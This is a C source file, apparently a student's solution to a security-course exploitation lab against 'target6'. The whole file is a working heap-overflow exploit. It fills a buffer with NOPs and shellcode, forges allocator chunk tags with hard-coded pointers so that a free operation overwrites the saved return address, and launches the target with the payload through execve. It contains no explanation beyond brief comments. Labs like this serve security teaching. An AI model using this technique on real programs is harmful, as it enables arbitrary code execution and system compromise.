#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target6"

/**
 * @brief
 *
 * &p = 0x104ec48
 * &q = 0x104ec98
 * rip = 0x2021fea8
 * @return int
 */

int p_addr = 0x104ec48;
int q_addr = 0x104ec98;
int rip_addr = 0x2021fea8;
int chunk_size = 8;
char fake_tag_1_left[] = "\x48\xec\x04\x01"; // p_addr
char fake_tag_1_right[] = "\xa0\xec\x04\x01"; // fake tag 2 address
char rip_r_tag_nfree[] = "\xa9\xfe\x21\x20"; // has free bit as 1


int main(void)
{
  char *args[3];
  char *env[1];

  char exploit_str[256];
  memset(exploit_str, 0, 256);

  while(strlen(exploit_str) < 8) strcat(exploit_str, NOP);
  strcat(exploit_str, shellcode);
  while(strlen(exploit_str) < 72) strcat(exploit_str, NOP);

  exploit_str[0] = shellcode[0];
  exploit_str[1] = '\x25'; // 0x1f + 6 bytes = 0x25
  exploit_str[4] = '\x91'; // Set freebit

  // fake tag 1 setup
  strcat(exploit_str, fake_tag_1_left);
  strcat(exploit_str, fake_tag_1_right);

  // fake tag 2 setup
  // fake tag 2 left doesn't matter
  while(strlen(exploit_str) < (q_addr - p_addr - chunk_size / 2 + chunk_size * 2)) strcat(exploit_str, NOP);
  strcat(exploit_str, rip_r_tag_nfree);

  args[0] = TARGET;
  args[1] = exploit_str;
  args[2] = NULL;

  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
